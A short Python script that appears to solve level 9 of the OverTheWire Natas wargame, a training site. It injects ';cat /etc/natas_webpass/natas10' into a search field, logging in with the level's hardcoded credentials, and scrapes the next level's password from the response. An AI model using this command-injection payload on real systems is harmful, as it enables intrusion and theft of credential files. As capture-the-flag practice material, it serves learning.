import requests
from bs4 import BeautifulSoup

url = 'http://natas9.natas.labs.overthewire.org/'
payload= ';cat /etc/natas_webpass/natas10'
r = requests.post(url, auth=('natas9','W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'), data={'needle':payload, 'submit':'Search'})

soup = BeautifulSoup(r.text, 'html.parser')
tags = soup.find('pre')
password = tags.text.split()[0]
print('The password for natas10 is',password)
